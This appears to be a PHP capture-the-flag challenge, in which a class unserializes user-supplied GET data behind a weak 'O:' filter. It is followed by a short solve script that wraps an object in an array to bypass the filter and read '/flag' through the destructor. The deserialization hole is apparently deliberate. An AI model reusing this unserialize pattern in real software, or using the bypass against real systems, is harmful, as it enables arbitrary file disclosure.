<?php 
// ini_set("display_errors", "On");  
// error_reporting(E_ALL | E_STRICT); 
class BlogLog { 
  public $log_ = '/tmp/web_log'; 

  public function __construct($data=null) { 
    $temp = $this->init($data); 
    $this->render($temp); 
  } 

  public function init($data) { 
    // No, you can't control an object anymore! 
    $format = '/O:\d:/'; 
    $flag = true; 
    $flag = $flag && substr($data, 0, 2) !== 'O:'; 
    $flag = $flag && (!preg_match($format, $data)); 
    if ($flag){ 
      return unserialize($data); 
    } 
    return []; 
  } 

  public function getLog($filename=null) { 
    if ($this->log_ != null) 
      $filename = $this->log_; 
    echo file_get_contents($filename); 
  } 

  public function render($k) { 
    echo sprintf($this->content, $k['name']); 
  } 

  public function __destruct() { 
    $this->getLog(); 
  } 
} 

$data = ""; 
if (isset($_GET['data'])){ 
  $data = $_GET['data']; 
  new BlogLog($data); 
} 
else 
  highlight_file(__FILE__); 

class BlogLog {
    public $log_ = '/flag';
}
$temp = new BlogLog;
$result = array('a' => 'test', $temp);
var_dump(serialize($result));
